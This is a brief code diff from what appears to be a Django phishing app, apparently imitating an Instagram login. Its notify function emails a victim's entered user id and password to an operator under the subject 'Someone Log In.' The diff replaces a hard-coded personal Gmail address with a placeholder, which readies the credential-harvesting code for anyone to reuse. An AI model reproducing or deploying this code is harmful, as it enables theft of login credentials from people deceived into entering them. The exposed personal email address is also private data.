@@ -23,5 +23,5 @@ def insta(request):
 
 def notify(type, userid, password):
     mail_from=settings.EMAIL_HOST_USER
-    to=["sahabsinghpatel07@gmail.com"]
+    to=["your_email_to_notify"]
     send_mail("Someone  Log In.", mail_from, f"{type} {userid} & {password}", to)
